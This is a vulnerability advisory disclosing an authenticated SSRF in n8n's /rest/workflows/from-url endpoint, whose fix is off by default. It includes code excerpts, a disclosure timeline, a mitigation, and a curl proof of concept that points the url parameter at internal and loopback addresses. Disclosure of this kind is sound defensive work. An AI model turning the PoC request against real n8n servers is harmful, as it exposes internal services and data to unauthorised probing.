Subject: n8n: authenticated SSRF in /rest/workflows/from-url, still
reachable by default after 2.20.0 fix gating (no CVE)

n8n: authenticated SSRF in GET /rest/workflows/from-url; affected: <=
2.19.x unconditionally, and 2.20.0+ when N8N_SSRF_PROTECTION_ENABLED is
unset (default false); verified on 2.27.4 (stable, source review) and
2.28.2 (pre-release, live test); CWE-918; CVE: none; reporter: Akshat
Sinha; fix was independent prior vendor work, not credited here.

GET /rest/workflows/from-url accepts a user-controlled url parameter and
makes a server-side HTTP request to it. Any authenticated user with
project-scoped workflow:create permission can use this to reach
loopback, link-local, and RFC1918 addresses. If the target returns JSON
shaped like an n8n workflow ({"nodes":..., "connections":...}), the body
is reflected to the caller.

The relevant code path is
packages/cli/src/workflows/workflows.controller.ts, where
fetchWorkflowFromUrl() now uses:

    private async fetchWorkflowFromUrl(url: string) {
      const client = this.outboundHttp.requests({
        ssrf: this.ssrfConfig.enabled ? this.ssrfProtectionService
                                      : 'disabled',
      });
      ...
    }

The gate is this.ssrfConfig.enabled. In
packages/@n8n/config/src/configs/ssrf-protection.config.ts (verified on
tag n8n@2.28.2):

    @Env('N8N_SSRF_PROTECTION_ENABLED')
    enabled: boolean = false;

So 2.20.0 added SSRF protection for this path, but behind an opt-in flag
that defaults to false. Default installs therefore remain exploitable.
Current stable 2.27.4 is affected by source review. The current
pre-release 2.28.2 is affected by live test. 2.28.2 is not a stable
release.

When N8N_SSRF_PROTECTION_ENABLED=true, the request is routed through
SsrfProtectionService, which checks resolved IPs before the request, at
connect time via custom lookup, and across redirects. With the flag
unset, the request is made with ssrf: 'disabled'.

Minimal PoC (executed 2026-06-26 local time against n8nio/n8n:2.28.2;
listener timestamps below are UTC):

    docker run -d -p 5678:5678 \
      -e N8N_SECURE_COOKIE=false \
      n8nio/n8n:2.28.2

    curl -s -G -b cookies.txt \
      'http://localhost:5678/rest/workflows/from-url' \
      --data-urlencode "projectId=$PROJECT_ID" \
      --data-urlencode 'url=http://172.17.0.1:8888/'

Default install result:

    {"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED_2282"}}
    --> HTTP 200

Listener log on the internal host:

    2026-06-27T04:20:15Z VICTIM-HIT path=/ UA=n8n from=172.17.0.2

A loopback target such as http://127.0.0.1:5678/rest/settings also
causes the server-side request to be issued; the response is HTTP 400
only because that body is not workflow-shaped.

With N8N_SSRF_PROTECTION_ENABLED=true, the same request returns:

    {"code":0,"message":"The request was blocked because it resolves
    to a restricted IP address"}
    --> HTTP 400

and no new listener hit is recorded.

Vendor handling / timeline:

    2026-04-27  n8n opened PR #29178 under ticket CAT-2890
    2026-04-29  I reported the same issue independently
    2026-04-29  PR #29178 merged
    2026-05-05  n8n 2.20.0 released with the protection gated by flag
    2026-05-20  vendor declined the report
    2026-06-26  live PoC re-run against 2.28.2 (local date)

PR #29178 predates my report. I do not claim credit for that fix. The
point of this post is narrower: the shipped protection is off by
default, so the default configuration remains exploitable on current
releases. No CVE or GHSA has been issued.

Mitigation:

    set N8N_SSRF_PROTECTION_ENABLED=true

This causes the import endpoint to use the SSRF checks. Network egress
filtering is also advisable.

References:

    PR #29178:
    https://github.com/n8n-io/n8n/pull/29178

    Public write-up:
    https://github.com/akshatgit/public-disclosure/blob/main/advisories/2026-06-26-n8n-ssrf-workflows-from-url.md

Reporter:

    Akshat Sinha

